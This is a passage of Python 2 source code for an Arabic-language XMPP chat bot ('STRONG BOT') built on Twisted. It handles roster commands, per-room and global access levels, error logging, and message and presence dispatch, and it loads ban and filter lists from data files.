    time.sleep(6)
    get_roster(cljid)

def get_roster(cljid):
    packet = IQ(CLIENTS[cljid], 'get')
    packet.addElement('query', 'jabber:iq:roster')
    packet.addCallback(roster_result_handler, cljid)
    reactor.callFromThread(packet.send, cljid)

def roster_result_handler(cljid, x):
    if x['type']=='result':
        if cljid in ROSTER.keys():
            ROSTER[cljid].clear()
        query = element2dict(x)['query']
        query = [i.attributes for i in query.children if i.__class__==domish.Element]
        if not cljid in ROSTER:
            ROSTER[cljid] = {}
        for c in query:
            try: ROSTER[cljid][c['jid']]=c['subscription']
            except: pass

def hnd_roster_del(t, s, p):
    if p:
        roster_del(p, s[3])
        reply(t, s, s[2]+' : '+Xroster[3])
        
def roster_del(jid, cljid):
    q = domish.Element(('jabber:client', 'iq'))
    q['type'] = 'set'
    q['id'] = str(random.randrange(1,999))
    query = q.addElement('query', 'jabber:iq:roster')
    i = query.addElement('item')
    i['jid'] = jid
    i['subscription'] = 'remove'
    reactor.callFromThread(dd, q, CLIENTS[cljid])

def hnd_roster_add(t, s, p):
    if p:
        roster_add(p, s[3])
        reply(t, s, s[2]+' : '+Xroster[3])		
def roster_add(jid, cljid):
    p = domish.Element(('jabber:client', 'presence'))
    p['to'] = jid
    p['type'] = 'subscribe'
    reactor.callFromThread(dd, p, CLIENTS[cljid])

def hnd_roster_all(t, s, p):
    global ROSTER
    get_roster(s[3])
    time.sleep(1)
    if not s[3] in ROSTER:
        reply(t, s, s[2]+' : '+Xroster[4])
        return
    n=len(ROSTER[s[3]])
    reply(t, s, s[2]+' : '+Xroster[5]+str(n)+':\n'+'\n'.join(ROSTER[s[3]].keys()))


register(hnd_roster_del, Xroster[0], 100)
register(hnd_roster_add, Xroster[1], 100)
register(hnd_roster_all, Xroster[2], 100)
register_stage0_init(get_roster_auto)

######################################################
######################################################

def initialize_file(filename, data=''):
        if not os.access(filename, os.F_OK):
                fp = file(filename, 'w')
                if data:
                        fp.write(data)
                fp.close()


def check_file(gch='',file=''):
        pth,pthf='',''
        if not isinstance(gch, basestring) or not isinstance(file, basestring):
                return 0
        if gch:
                pthf='rooms-data/'+gch+'/'+file
                pth='rooms-data/'+gch
        else:
                pthf='rooms-data/'+file
                pth='rooms-data'
        if os.path.exists(pthf):
                return 1
        else:
                try:
                        if not os.path.exists(pth):
                                os.mkdir(pth,0755)
                        if os.access(pthf, os.F_OK):
                                fp = file(pthf, 'w')
                        else:
                                fp = open(pthf, 'w')
                        fp.write('{}')
                        fp.close()
                        return 1
                except:
                        return 0
		
def get_true_jid(jid):
        true_jid = ''
        try:
                if type(jid) is types.ListType:
                        jid = jid[0]
                if type(jid) is types.InstanceType:
                        jid = unicode(jid)
                stripped_jid = jid.split('/', 1)[0]
                resource = ''
                if len(jid.split('/', 1)) == 2:
                        resource = jid.split('/', 1)[1]
                if GROUPCHATS.has_key(stripped_jid):
                        if GROUPCHATS[stripped_jid].has_key(resource):
                                true_jid = unicode(GROUPCHATS[stripped_jid][resource]['jid']).split('/', 1)[0]
                                if GROUPCHATS.has_key(true_jid):
                                        return unicode(GROUPCHATS[stripped_jid][resource]['jid'])
                        else:
                                true_jid = stripped_jid
                else:
                        true_jid = stripped_jid
        except: return 'none@tld.ru'
        return true_jid
        
def get_true_jidd(jid):
        true_jid = ''
        try:
                if type(jid) is types.ListType:
                        jid = jid[0]
                if type(jid) is types.InstanceType:
                        jid = unicode(jid)
                stripped_jid = jid.split('/', 1)[0]
                resource = ''
                if len(jid.split('/', 1)) == 2:
                        resource = jid.split('/', 1)[1]
                if GROUPCHATS.has_key(stripped_jid):
                        if GROUPCHATS[stripped_jid].has_key(resource):
                                true_jid = unicode(GROUPCHATS[stripped_jid][resource]['jid']).split('/', 1)[0]+' ـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n\n♡ الريسورس الخاص بهذا الشخص هو ♡ \n '+unicode(GROUPCHATS[stripped_jid][resource]['jid']).split('/', 1)[1]+'\n'
                                if GROUPCHATS.has_key(true_jid):
                                        return unicode(GROUPCHATS[stripped_jid][resource]['jid'])
                        else:
                                true_jid = stripped_jid
                else:
                        true_jid = stripped_jid
        except: return 'none@tld.ru'
        return true_jid

def change_access_temp(gch, source, level=0):
        global ACCBYCONF
        jid = get_true_jid(source)
        try:
                level = int(level)
        except:
                level = 0
        if not ACCBYCONF.has_key(gch):
                ACCBYCONF[gch] = gch
                ACCBYCONF[gch] = {}
        if not ACCBYCONF[gch].has_key(jid):
                ACCBYCONF[gch][jid]=jid
        ACCBYCONF[gch][jid]=level

def change_access_perm(gch, source, level=None):
        global ACCBYCONF
        jid = get_true_jid(source)
        try:
                level = int(level)
        except:
                pass
        temp_access = eval(read_file(ACCBYCONF_FILE))
        if not temp_access.has_key(gch):
                temp_access[gch] = gch
                temp_access[gch] = {}
        if not temp_access[gch].has_key(jid):
                temp_access[gch][jid]=jid
        if level:
                temp_access[gch][jid]=level
        else:
                del temp_access[gch][jid]
        write_file(ACCBYCONF_FILE, str(temp_access))
        if not ACCBYCONF.has_key(gch):
                ACCBYCONF[gch] = gch
                ACCBYCONF[gch] = {}
        if not ACCBYCONF[gch].has_key(jid):
                ACCBYCONF[gch][jid]=jid
        if level:
                ACCBYCONF[gch][jid]=level
        else:
                del ACCBYCONF[gch][jid]
        get_access_levels()

def change_access_perm_glob(source, level=0):
        global GLOBACCESS
        jid = get_true_jid(source)
        temp_access = eval(read_file(GLOBACCESS_FILE))
        if level:
                temp_access[jid] = level
        else:
                del temp_access[jid]
        write_file(GLOBACCESS_FILE, str(temp_access))
        get_access_levels()
	
def change_access_temp_glob(source, level=0):
        global GLOBACCESS
        jid = get_true_jid(source)
        if level:
                GLOBACCESS[jid] = level
        else:
                del GLOBACCESS[jid]

def user_level(source, gch):
        global ACCBYCONF
        global GLOBACCESS
        global ACCBYCONFFILE
        jid = get_true_jid(source)
        if jid in ADMINS:
                return 100
        if GLOBACCESS.has_key(jid):
                return GLOBACCESS[jid]
        if ACCBYCONFFILE.has_key(gch):
                if ACCBYCONFFILE[gch].has_key(jid):
                        return ACCBYCONFFILE[gch][jid]
        if ACCBYCONF.has_key(gch):
                if ACCBYCONF[gch].has_key(jid):
                        return ACCBYCONF[gch][jid]
        return 0
	
def has_access(source, level, gch):
        jid = get_true_jid(source)
        if user_level(jid,gch) >= int(level):
                return 1
        return 0
from copy import deepcopy

host = ("login.icq.com", 5238)
icqMode = 1

JAB, ICQ = None, None

WIN_COD = {}

INFMELODY = {'tlasterr':{'t':0,'err':''},'tin':0,'tout':0,'start':0, 'imsg':0, 'jmsg':0, 'auth':0, 'err':0, 'thr':0, 'cmd':0, 'out':0}

class err:
        def write(self, text):
		        #print 'ERROR REGISTER!'
                if text.isspace():
                        return
                err_write(text)
                INFMELODY['err']+=1
                if time.time()-INFMELODY['tlasterr']['t']>120:
                        list=[x for x in GLOBACCESS.keys() if GLOBACCESS[x]==100]
                        for x in list:
                                if CLIENTS and ENABLE_ERROR_MESSAGE=='1':
                                        i=random.choice(CLIENTS.keys())
                                        msg(i, x, u'...')
                        INFMELODY['tlasterr']['t']=time.time()
                        INFMELODY['tlasterr']['err']=text

def get_bot_nick(chat):
        nick=DEFAULT_NICK
        if chat in BOT_NICK.keys():
                nick=BOT_NICK[chat]
        if isinstance(nick, basestring): return nick
        else: return DEFAULT_NICK

def err_write(text):
        try: hnd_err_add(text)
        except: pass

def hnd_err_add(text):
  (year, month, day, hour, minute, second, weekday, yearday, daylightsavings) = time.localtime()
  tm=str(hour)+':'+str(minute)+':'+str(second)
  data=str(year)+':'+str(month)+':'+str(day)
  fName='data/log.py'
  try: open(fName)
  except:
    open(fName,'w').write("""bot error""")
  open(fName,'a').write(("\n%s [%s]:\n%s\n"%(data,tm,text)))

sys.stderr = err()

if ENABLE_CONSOLE_LOG == '1':
        print '\n\nseen << foo.log >> for more detalis.'
        log.startLogging(open('foo.log', 'w'))
        log.addObserver(error_handler)


def timeElapsed(time):
        minutes, seconds = divmod(time, 60)
        hours, minutes = divmod(minutes, 60)
        days, hours = divmod(hours, 24)
        months, days = divmod(days, 30.44)
        year, months = divmod(months, 12)
        rep = u'%d ثانية ' % (round(seconds))
        if time>=60: rep = u'%d دقائق %s' % (minutes, rep)
        if time>=3600: rep = u'%d ساعة %s' % (hours, rep)
        if time>=86400: rep = u'%d يوم %s' % (days, rep)
        if time>=2629743: rep = u'%d شهر %s' % (months, rep)
        if time>=31556926: rep = u'%d سنة %s' % (year, rep)
        return rep

def byteString(b):
        kb, byte = divmod(b, 1024)
        mb, kb = divmod(kb, 1024)
        gb, mb = divmod(mb, 1024)
        rep = u'%d b' % (round(byte))
        if b>=1024: rep = u'%d Kb %s' % (kb, rep)
        if b>=1048576: rep = u'%d Mb %s' % (mb, rep)
        if b>=1073741824: rep = u'%d Gb %s' % (gb, rep)
        return rep




TIMER_500 = {'t':0,'clc':0}
TIMER_403 = 0

INFMELODY['start'] = time.time()

aaartrt={}  
if not "test" in aaartrt:
 aaartrt={"test":0}
 
horexyt= time.localtime().tm_year  
 
class MelodX(object):
        """Basic """
	
        def __init__(self, password, jid, reactor=reactor, port=PORTX, resource=DEFRES):     
              global INFMELODY
                
              self.jabberid = jid
              self.password = password
              #self.restart = 1
              self.servername = jid[jid.find('@')+1:]
              self.port = port
              self.resource = resource#str(random.randrange(100,999))
		
                # internal values
              self._jid = None
              self.osver = osver
              self._factory = None
              self._reactor = reactor
              self._resource = None
              self._xmlstream = None
              self.tryandregister = 1
              self.__initFactory11()

	
        def run(self):
                self.__initFactory11()

        def errfactory(self, x):
                print 'Factory Err back'
                try: err_write(unicode(x))
                except: pass
	
        def __repr__(self):
                return "<%s (%s)>" % (type(self).__name__, self.jabberid)
	
        def __initFactory11(self):
                self._conn = None
                self._jid = jid.JID("%s/%s" % (self.jabberid, self.resource))
                self._factory = client.basicClientFactory(self._jid, self.password)
		
                self._factory.addBootstrap('//event/stream/authd', self._authd)
                self._factory.addBootstrap('//event/client/basicauth/authfailed', self.failed)
                self._factory.addBootstrap('//event/client/basicauth/invaliduser', self.failed)				
                self._factory.addBootstrap(xmlstream.STREAM_ERROR_EVENT, self._streamError)
                if USE_SSL in [1,'1']:
                        try: self._conn = self._reactor.connectSSL(Bot_jid.split('@')[1],443,self._factory,ssl.ClientContextFactory())
                        except: pass
                else:
                        self._conn = self._reactor.connectTCP(self.servername, self.port, self._factory, timeout=1)
                #self._conn.addErrback(self.errfactory)
                if not reactor.running:
                        if ENABLE_IRC in ['1']:
                                f = IRCBotFactory()
                                reactor.connectTCP(IRC_SERV.encode('utf-8','ignore'), 6667, f)
                        if ENABLE_ICQ in ['1']:
                                protocol.ClientCreator(reactor, BotAuth, UIN, ICQ_PASS, icq=icqMode).connectTCP(*host)
                        self._reactor.run()




        def _streamError(self, xs):
                print 'Xmpp  Error'
                try: el=xs.value.getElement()
                except: return
                if el.firstChildElement().name == 'Conflict':
                       # self.restart = 0
                        print 'XMPP Conflict'
                        if hasattr(self._factory, 'stopTrying'):
                                 self._factory.stopTrying()
                        if hasattr(self._conn, 'disconnect'):
                                self._conn.disconnect()
                        self._factory = None
                        self._conn = None

	
        def _authd(self, xmlstream):
                if xmlstream:
                        self._xmlstream = xmlstream
			
                        # set it as online
                        self._presence = domish.Element(('jabber:client', 'presence'))
                        self._presence.addElement('status').addContent("مرحبآ بك في STRONG BOT \n يتم تحديث البوت بشكل أسبوعي \n ان كان لديك مشكلة او اقتراح يساعد في تطوير البوت \n يرجى التواصل معنا على الحسابات التالية:\n ahmed@server.com\n darsh@server.com \n فقط قم بتعديل  السرفر للسرفر المتواجد عليه البوت \n وشكرا .")
                        self._presence.addElement('show').addContent('online')
                        self._xmlstream.send(self._presence)

                        self.__initOnline55()
                        try: Print('ID: %s ConnecTed!' % unicode(self.jabberid), color3) 
                        except: pass
			

                        global CLIENTS
                        CLIENTS[self.jabberid] = self._xmlstream
                        #JAB = self._xmlstream
                        global CLIENTS_UPTIME
                        CLIENTS_UPTIME[self.jabberid] = time.time()

                        threading.Thread(None, stage0, 'stage0_thread'+str(INFMELODY['thr']),(self.jabberid,)).start()
                        foostart()
                        threading.Thread(None,load_rooms,'load_rooms'+str(random.randrange(0,9999)),(self.jabberid,)).start()
                      #  threading.Thread(None,ressto,'ressto'+str(random.randrange(0,9999)),(self.jabberid,)).start()						
                        vcard_set()

        def IqHnd66(self, el):
                xmlns, i = '',''
                typ = el.getAttribute('type')
                for query in el.elements(): xmlns = query.uri
                if (xmlns == 'jabber:iq:version') and (typ == 'get'):
                        answer = domish.Element(('jabber:client', 'iq'))
                        answer['type'] = 'result'
                        answer['id'] = el.getAttribute('id')
                        answer['to'] = el.getAttribute('from')
                        query = answer.addElement('query', 'jabber:iq:version')
                        query.addElement('name').addContent(XREW+' BōT :-) ')
                        query.addElement('version').addContent(u'By '+XREWZ+' ;-)')
                        OSname1 = "v%s" % (sys.version.split(' (')[0])
                        OSname2 = "v%s.%s.%s" % (TwistedVer.major,TwistedVer.minor,TwistedVer.micro)
                        query.addElement('os').addContent("PyThon " + OSname1 + " - " + "TwisTed " + OSname2)
                        self._xmlstream.send(answer)
                        if (xmlns == 'urn:xmpp:ping') and (typ == 'get'):
                                answer = domish.Element(('jabber:client', 'iq'))
                                answer['type'] = 'result'
                                answer['id'] = el.getAttribute('id')
                                answer['to'] = el.getAttribute('from')
                                self.xlstream.send(answer)
                call_iq_handlersx5x(el, self.jabberid)
	
        def __initOnline55(self):
                self._xmlstream.addObserver('/message', self._gotMessage)
                self._xmlstream.addObserver('/presence', self.Presence)
                self._xmlstream.addObserver('/iq', self.IqHnd66)


        def failed(self, x):
                Print ('\n\nConnect Error or pasword', color3) 
                print unicode(x.toXml())
                self.restart = 0
				
				
        def Presence(self, x):
                try: typ = x['type']
                except: typ = 'available'
                try: INFMELODY['tin']+=sys.getsizeof(x)
                except: pass
                
                jid = x['from'].split('/')
                groupchat = jid[0]
                   				
  					 
                nick = x['from'][len(groupchat)+1:]   					 
                SUB = {'subscribe':'subscribed','unsubscribe':'unsubscribed'}			
                if typ in SUB:
                 if x['from'].split('/')[0] in GLOBACCESS:		
                     p = domish.Element(('jabber:client', 'presence'))
                     p['type'] = SUB[typ]
                     p['to'] = x['from']
                     self._xmlstream.send(p)
                     INFMELODY['auth']+=1	
                     print x['from'].split('/')[0]				 
                reason = ''
                if typ == 'available':
                        try:
                                _x = [i for i in x.children if (i.name=='x') and (i.uri=='http://jabber.org/protocol/muc#user')][0]
                                _item = [i for i in _x.children if i.name=='item'][0]
                                afl = _item['affiliation']
                                role = _item['role']
                                try: realjid = _item['jid']
                                except: realjid = x['from']
                                ########
                                if groupchat in GROUPCHATS:
                                        if groupchat in JOIN_CALLBACK and nick==get_bot_nick(groupchat):
                                                msg(self.jabberid, JOIN_CALLBACK[groupchat], u'تم دخولي الى الغرفة باسم :\n'+get_bot_nick(groupchat))
                                                del JOIN_CALLBACK[groupchat]
                                        if nick in GROUPCHATS[groupchat] and GROUPCHATS[groupchat][nick]['jid']==realjid and GROUPCHATS[groupchat][nick]['ishere']==1:
                                                pass
                                        else:
                                                GROUPCHATS[groupchat][nick] = {'jid': realjid, 'idle': time.time(), 'joined': time.time(), 'ishere': 1, 'status': '', 'stmsg': ''}
                                                if role=='moderator' or user_level(jid,groupchat)>=15:
                                                        GROUPCHATS[groupchat][nick]['ismoder'] = 1
                                                else:
                                                        GROUPCHATS[groupchat][nick]['ismoder'] = 0
                                                call_join_handlersx4x(groupchat, nick, afl, role, self.jabberid)
                        except: pass
                        
                if typ == 'unavailable':
                        try:
                                if groupchat == Bot_jid: return
                                
                                _x = [i for i in x.children if (i.name=='x') and (i.uri == 'http://jabber.org/protocol/muc#user')][0]
                                _item = [i for i in _x.children if i.name=='item'][0]

                                try: reason = [i for i in _item.children if i.name=='reason'][0].children[0]
                                except: pass
                                
                                _status = [i['code'] for i in _x.children if i.name=='status']
                                if groupchat in GROUPCHATS:
                                        if '301' in _status and nick==get_bot_nick(groupchat):
                                                to_admin(u'تم حظري في:\n'+groupchat)
                                        if '307' in _status and nick==get_bot_nick(groupchat):
                                                to_admin(u'تم طردي في:\n'+groupchat)
                                        if '303' in _status:
                                                try: newnick = _item['nick']
                                                except: newnick = '[unknown nick]'
                                                GROUPCHATS[groupchat][newnick] = {'jid': jid, 'idle': time.time(), 'joined': GROUPCHATS[groupchat][nick]['joined'], 'ishere': 1}
                                                for x in ['idle','status','stmsg']:
                                                        try:
                                                                del GROUPCHATS[groupchat][nick][x]
                                                                if GROUPCHATS[groupchat][nick]['ishere']==1:
                                                                        GROUPCHATS[groupchat][nick]['ishere']=0
                                                        except:
                                                                pass
                                        else:
                                                for x in ['idle','status','stmsg','joined']:
                                                        try:
                                                                del GROUPCHATS[groupchat][nick][x]
                                                                if GROUPCHATS[groupchat][nick]['ishere']==1:
                                                                        GROUPCHATS[groupchat][nick]['ishere']=0
                                                        except:
                                                                pass
                                        call_leave_handlers(groupchat, nick, reason, ' '.join(_status), self.jabberid)
                                else:
                                        call_offline_handlersx3x(gropchat)
                                        
                        except: pass
                        
                if typ == 'error' and groupchat in GROUPCHATS:
                        try:
                                add=''
                                list = [i['code'] for i in x.children if (i.name=='error')]
                                ERROR={'400':u'لا يمكن','401':u' ','402':u' ','403':u'مفصول','404':u'غير موجود','405':u' ','406':u' ','407':u'الغرفة للمشتركين','408':u'hghgh','409':u'متصل','500':u' ','501':u' ','503':u' ','504':u' '}
                                if ''.join(list) in ERROR:
                                        add=ERROR[''.join(list)]
                                if groupchat in JOIN_CALLBACK and nick==get_bot_nick(groupchat):
                                        try: msg(self.jabberid, JOIN_CALLBACK[groupchat], u'الدخول الى غرفة :\n'+groupchat+u'\n\رمز الخطأ:\n'+' '.join(list)+' '+add)
                                        except: msg(JOIN_CALLBACK[groupchat], u'fdsfds:\n'+groupchat)
                                        del JOIN_CALLBACK[groupchat]
                                if '409' in list:
                                        aaartrt["test"]+=1  
                                        uutrtr= aaartrt["test"] 	
                                        join(groupchat, nick+"-"+str(uutrtr), self.jabberid)
                                if '404' in list or '503' in list:
                                        global JOIN_TIMER
                                        JOIN_TIMER[groupchat]={'time':time.time(),'nick':nick, 'bot':self.jabberid}
                                if ' '.join(list) in ['401','403','405']:
                                        del GROUPCHATS[groupchat]
                        except: print 'exception in Presence '
                        
                if len(JOIN_TIMER)>0:
                        for x in JOIN_TIMER.keys():
                                if time.time()-JOIN_TIMER[x]['time']>70:
                                        if 'bot' in JOIN_TIMER[x]:
                                                join(x, JOIN_TIMER[x]['nick'], JOIN_TIMER[x]['bot'])
                                                del JOIN_TIMER[x]
                call_presence_handlers77(x, self.jabberid)
                
     
	
        def _gotMessage(self, el):
              INFMELODY['jmsg']+=1
              try: INFMELODY['tin']+=sys.getsizeof(el)
              except: pass
              try: mtype=el["type"]
              except: return
              global TIMER_500
              global TIMER_403
              fromjid = el["from"]
              jid = fromjid.split('/')[0]
              Wacc=access_level=str(user_level(fromjid, jid))  			  
              res, body, ns = '', '', ''
              for y in el.elements(): 
               if y.name == "body": bodyx = y.__str__()			  
              if "groupchat" in Tolls_BOT_CMD:	
               try:			  
                if "allow" in bodyx and mtype=='chat' or jid in GLOBACCESS or mtype=="groupchat" or 'pres10' in bodyx and mtype=='chat' or 'pres11' in bodyx and mtype=='chat' or Xacl[0] in bodyx and mtype=='chat' or int(Wacc) >= int(Breck_Access):               	   
                 if mtype == "error":
                        #print '- XMPP Message error-in'
                        try: list = [i['code'] for i in el.children if (i.name=='error')]
                        except: list = []
                        code = ''.join(list)
                        #print code
                        if code == '403':
                                if time.time() - TIMER_403 < 2: return
                                TIMER_403 = time.time()
                                if jid in GROUPCHATS and fromjid.split('/')>1 and hasattr(el, 'body'):
                                        time.sleep(1.3)
                                        try: msg(self.jabberid, jid, u'....:\n'+unicode(el.body))
                                        except: msg(self.jabberid, jid, u'dffff')
                        if code == '500' and hasattr(el, 'body'):
                                if time.time()-TIMER_500['t'] < 1.2:
                                        if TIMER_500['clc']>10:
                                                return
                                        TIMER_500['clc']+=1
                                else:
                                        TIMER_500['clc'] = 0
                                TIMER_500['t'] = time.time()
                                try:
                                        stanza = domish.Element(('jabber:client','message'))
                                        stanza['to'] = fromjid
                                        stanza['type'] = ('groupchat' if fromjid in GROUPCHATS else 'chat')
                                        cntlist=[]
                                        for x in el.elements():
                                                if x.name == 'error' or x.name in cntlist:
                                                        continue
                                                else:
                                                        cntlist.append(x.name)
                                                        stanza.addElement(x.name, content=x)
                                        threading.Thread(None, dd, 'dd'+str(INFMELODY['thr']),(stanza,CLIENTS[self.jabberid],2)).start()
                                except: pass 
                        return

                 if len(fromjid.split('/'))==2:
                        res = fromjid.split('/')[1]

                 if mtype == "groupchat":
                        if GROUPCHATS.has_key(jid) and res and GROUPCHATS[jid].has_key(res):
                                GROUPCHATS[jid][res]['idle'] = time.time()
		
		
                 for e in el.elements():
                        if e.uri in [NS_DELAY,NS_JABBER_DELAY]: return
                        if e.name == "body": body = e.__str__()
		
                 call_message_handlersx2x(el, mtype, [fromjid, jid, res, self.jabberid], body)

                 bot_nick = get_bot_nick(jid)

                 if res == bot_nick: return

                 if jid in PERSONAL_CMD.keys() and mtype == 'groupchat':
                        if hasattr(body,'count') and not body.count(bot_nick):
                                return

                 for x in [bot_nick+x for x in [':',',','>']]:
                        body=body.replace(x,'')

                 body = body.strip()
                 cbody = body
                 if not body: return
                 cmd = body.lower()
                 parameters=''
                 if body.count(' '):
                        s=body.split()
                        cmd=s[0].lower()
                        parameters=' '.join(s[1:])
                 if cbody.count(' '): parameters = cbody[(cbody.find(' ') + 1):].strip()
                 if cmd in COMMAND1S:
                        Print('# Register', color5)
                        if jid in COMMOFF and cmd in COMMOFF[jid]: return				
                        call_command_2handlere(cmd, mtype, [fromjid, jid, res, self.jabberid], unicode(parameters))
               except: pass 						
              elif "all" in Tolls_BOT_CMD:	               
                if mtype == "error":
                        try: list = [i['code'] for i in el.children if (i.name=='error')]
                        except: list = []
                        code = ''.join(list)
                        #print code
                        if code == '403':
                                if time.time() - TIMER_403 < 2: return
                                TIMER_403 = time.time()
                                if jid in GROUPCHATS and fromjid.split('/')>1 and hasattr(el, 'body'):
                                        time.sleep(1.3)
                                        try: msg(self.jabberid, jid, u' ....:\n'+unicode(el.body))
                                        except: msg(self.jabberid, jid, u' ...')
                        if code == '500' and hasattr(el, 'body'):
                                if time.time()-TIMER_500['t'] < 1.2:
                                        if TIMER_500['clc']>10:
                                                return
                                        TIMER_500['clc']+=1
                                else:
                                        TIMER_500['clc'] = 0
                                TIMER_500['t'] = time.time()
                                try:
                                        stanza = domish.Element(('jabber:client','message'))
                                        stanza['to'] = fromjid
                                        stanza['type'] = ('groupchat' if fromjid in GROUPCHATS else 'chat')
                                        cntlist=[]
                                        for x in el.elements():
                                                if x.name == 'error' or x.name in cntlist:
                                                        continue
                                                else:
                                                        cntlist.append(x.name)
                                                        stanza.addElement(x.name, content=x)
                                        threading.Thread(None, dd, 'dd'+str(INFMELODY['thr']),(stanza,CLIENTS[self.jabberid],2)).start()
                                except: pass 
                        return

                if len(fromjid.split('/'))==2:
                        res = fromjid.split('/')[1]

                if mtype == "groupchat":
                        if GROUPCHATS.has_key(jid) and res and GROUPCHATS[jid].has_key(res):
                                GROUPCHATS[jid][res]['idle'] = time.time()
		
		
                for e in el.elements():
                        if e.uri in [NS_DELAY,NS_JABBER_DELAY]: return
                        if e.name == "body": body = e.__str__()
		
                call_message_handlersx2x(el, mtype, [fromjid, jid, res, self.jabberid], body)

                bot_nick = get_bot_nick(jid)

                if res == bot_nick: return

                if jid in PERSONAL_CMD.keys() and mtype == 'groupchat':
                        if hasattr(body,'count') and not body.count(bot_nick):
                                return

                for x in [bot_nick+x for x in [':',',','>']]:
                        body=body.replace(x,'')

                body = body.strip()
                cbody = body
                if not body: return
                cmd = body.lower()
                parameters=''
                if body.count(' '):
                        s=body.split()
                        cmd=s[0].lower()
                        parameters=' '.join(s[1:])
                if cbody.count(' '): parameters = cbody[(cbody.find(' ') + 1):].strip()
                if cmd in COMMAND1S:
                        Print('# Register', color5)
                        if jid in COMMOFF and cmd in COMMOFF[jid]: return				
                        call_command_2handlere(cmd, mtype, [fromjid, jid, res, self.jabberid], unicode(parameters))    
              else: print "Error in Tolls_BOT_CMD type groupchat or all"	
			  
def read_file(filename):
        data=None
        try:
                fp = file(filename)
                data = fp.read()
                fp.close()
        except: pass
        return data

TO_ADMIN = {}

def to_admin(body):
        global TO_ADMIN
        global CLIENTS
        for x in [x for x in GLOBACCESS.keys() if GLOBACCESS[x]==100]:
                if not x in TO_ADMIN:
                        TO_ADMIN[x]={'m':body, 't':time.time()}
                else:
                        if time.time() - TO_ADMIN[x]['t']<15:
                                continue
                        if body == TO_ADMIN[x]['m']:
                                continue
                        TO_ADMIN[x]['m']=body
                        TO_ADMIN[x]['t']=time.time()
                i=random.choice(CLIENTS.keys())
                msg(i, x, body)

def write_file_gag(filename, data):
        fp = file(filename, 'w')
        fp.write(data)
        fp.close()

def write_file_switch(filename, data, loc):
        if loc:
                try:
                        mtx.acquire(1)
                        write_file_gag(filename, data)
                finally:
                        mtx.release()
        else: write_file_gag(filename, data)

def write_file(filename, data, loc=1):
        write_file_switch(filename, data, loc)

def db_file(filename, typ=dict):
        attr, i = {dict:'{}',list:'[]'}, None
        if not os.path.exists(filename):
                fp = file(filename, 'w')
                fp.write(attr[typ])
                fp.close()
        else:
                fp = read_file(filename)
                try: i=eval(fp)
                except:
                        write_file(filename, attr[typ], 0)
                        return
                if not isinstance(i, typ):
                        write_file(filename, attr[typ], 0)

	
	
	
MUC_NICK_NEW={}

MUC_NICK_NEW_FILE = 'data/Filter_Nick_New.py'
db_file(MUC_NICK_NEW_FILE, dict)
try:
    MUC_NICK_NEW	 = eval(read_file(MUC_NICK_NEW_FILE))
except: pass		

Melody_RSS	 = {}
Melody_RSS_FILE = 'data/Melody_RSS.py'
db_file(Melody_RSS_FILE, dict)
try:
    Melody_RSS	 = eval(read_file(Melody_RSS_FILE))
except: pass		
	
Melody_Game	 = {}
Melody_Game_FILE = 'data/Start.py'
db_file(Melody_Game_FILE, dict)
try:
    Melody_Game	 = eval(read_file(Melody_Game_FILE))
except: pass		
		
Game_Bot = {}
Game_Bot_FILE = 'Games/Game.py'
db_file(Game_Bot_FILE, dict)
try:
    Game_Bot = eval(read_file(Game_Bot_FILE))
except: pass	
	
Game_Bot1 = {}
Game_Bot1_FILE = 'data/Start1.py'
db_file(Game_Bot1_FILE, dict)
try:
    Game_Bot1 = eval(read_file(Game_Bot1_FILE))
except: pass			
			

######################################################
######################################################					
MUC_LIN_FILTER = {}
MUC_LIN_FILTER_FILE = 'data/Order_Filter.py'
db_file(MUC_LIN_FILTER_FILE, dict)
try:
    MUC_LIN_FILTER = eval(read_file(MUC_LIN_FILTER_FILE))
except: pass	

######################################################
######################################################						
NAWRS1 = {}
NAWRS1_FILE = 'data/OS_Filter.py'
db_file(NAWRS1_FILE, dict)
try:
    NAWRS1 = eval(read_file(NAWRS1_FILE))
except: pass	

						
MUC_PV_FILE = 'data/PV.py'
db_file(MUC_PV_FILE, dict)
try:
    MUC_PV = eval(read_file(MUC_PV_FILE))
except: pass	
						

######################################################
######################################################					
MUC_AR_EN = {}
MUC_AR_EN_FILE = 'data/GoodLang.py'
db_file(MUC_AR_EN_FILE, dict)
try:
    MUC_AR_EN = eval(read_file(MUC_AR_EN_FILE))
except: pass						
######################################################
######################################################
MUC_Alias = {}
MUC_Alias_FILE = 'data/Alias.py'
db_file(MUC_Alias_FILE, dict)
try:
    MUC_Alias = eval(read_file(MUC_Alias_FILE))
except: pass
GMUC_Alias = {}
GMUC_Alias_FILE = 'data/GAlias.py'
db_file(GMUC_Alias_FILE, dict)
try:
    GMUC_Alias = eval(read_file(GMUC_Alias_FILE))
except: pass
######################################################
######################################################
MUC_noisy = {}

MUC_noisy_FILE = 'data/Noisy.py'
db_file(MUC_noisy_FILE, dict)

try:
    MUC_noisy = eval(read_file(MUC_noisy_FILE))
except:
    pass
######################################################
######################################################

######OS
BANOS = {}
BANOS_FILE = 'data/BadOs.py'
db_file(BANOS_FILE, dict)
try:
    BANOS = eval(read_file(BANOS_FILE))
except: pass
######################################################
######################################################
BANOS_2 = {}
BANOS_2_FILE = 'data/BadOs_new.py'
db_file(BANOS_2_FILE, dict)
try:
    BANOS_2 = eval(read_file(BANOS_2_FILE))
except: pass
######################################################
######################################################
GBANOS = {}
GBANOS_FILE = 'data/GBadOs.py'
db_file(GBANOS_FILE, dict)
try:
    GBANOS = eval(read_file(GBANOS_FILE))
except: pass	
######################################################
######################################################
ROLEX = {}
ROLEX_FILE = 'data/Role.py'
db_file(ROLEX_FILE, dict)
try:
    ROLEX = eval(read_file(ROLEX_FILE))
except:
    pass
######################################################
######################################################
BANCAPS = {}
BANCAPS_FILE = 'data/BadCaps.py'
db_file(BANCAPS_FILE, dict)
try:
    BANCAPS = eval(read_file(BANCAPS_FILE))
except: pass	
GBANCAPS = {}
GBANCAPS_FILE = 'data/GBadCaps.py'
db_file(GBANCAPS_FILE, dict)
try:
    GBANCAPS = eval(read_file(GBANCAPS_FILE))
except: pass	
######################################################
######################################################
BANRES = {}
BANRES_FILE = 'data/BadRes.py'
db_file(BANRES_FILE, dict)
try:
    BANRES = eval(read_file(BANRES_FILE))
except:
    pass
GBANRES = {}
GBANRES_FILE = 'data/GBadRes.py'
db_file(GBANRES_FILE, dict)
try:
    GBANRES = eval(read_file(GBANRES_FILE))
except:
    pass	
######################################################
######################################################
BANDO = {}
BANDO_FILE = 'data/BadServ.py'
db_file(BANDO_FILE, dict)
try:
    BANDO = eval(read_file(BANDO_FILE))
except:
    pass
GBANDO = {}
